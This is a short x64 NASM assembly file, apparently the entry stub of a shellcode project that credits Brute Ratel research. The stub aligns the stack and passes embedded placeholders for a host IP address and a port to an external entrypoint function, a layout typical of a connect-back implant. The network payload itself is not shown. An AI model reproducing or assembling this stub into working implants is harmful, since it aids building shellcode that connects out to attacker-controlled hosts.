; Entrypoint for the shellcode, it simply aligns the stack and calls the effective entrypoint
; Part of code and ideas taken from https://bruteratel.com/research/feature-update/2021/01/30/OBJEXEC/
; To compile use: nasm -f win64 adjuststack.asm -o adjuststack.o

extern entrypoint
global alignstack

segment .text

alignstack:
	push rbp,						; save rbp
	mov rbp, rsp					; save current stack frame start into rbp
	and rsp, 0xfffffffffffffff0		; stack alignment

	lea rcx, [rel lHost]			; first parameter of entrypoint() is lHost, use rip relative addressing to retrieve the address of the buffer
									; in this way, the buffer is contained in the shellcode and the code can locate it in a position independent way
	mov rdx, [rel lPort]			; second parameter of entrypoint() is lPort (use rip relative addressing too)
	
	call entrypoint					; call "real"
	mov rsp, rbp					; restore rsp, skipping alignment
	pop rbp							; restore rbp
	ret
; placeholder for wchar_t string with the IP address
lHost:	dw	0xaaaa, 0xaaaa, 0xaaaa, 0xaaaa, 0xaaaa, 0xaaaa, 0xaaaa, 0xaaaa, 0xaaaa, 0xaaaa, 0xaaaa, 0xaaaa, 0xaaaa, 0xaaaa, 0xaaaa, 0xaaaa
; placeholder for ushort with lPort
lPort: dw 0xbbbb